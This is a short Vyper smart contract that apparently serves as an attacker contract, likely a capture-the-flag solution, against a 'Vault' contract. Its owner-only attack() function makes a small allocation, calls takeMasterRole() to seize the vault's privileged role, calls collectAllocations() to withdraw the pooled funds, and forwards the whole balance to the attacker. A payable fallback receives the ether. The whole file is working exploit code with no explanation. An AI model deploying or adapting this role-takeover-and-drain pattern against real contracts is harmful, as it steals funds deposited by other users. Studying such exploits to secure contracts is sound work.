# @version ^0.3.7

interface IVault:
    def allocate(): payable
    def takeMasterRole(): nonpayable
    def collectAllocations(): nonpayable

owner: immutable(address)

vault: IVault

@external
@payable
def __init__(_vault: address):
    owner = msg.sender
    self.vault = IVault(_vault)

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.vault.allocate()
    self.vault.takeMasterRole()
    self.vault.collectAllocations()
    send(owner, self.balance)

@external
@payable
def __default__():
    pass
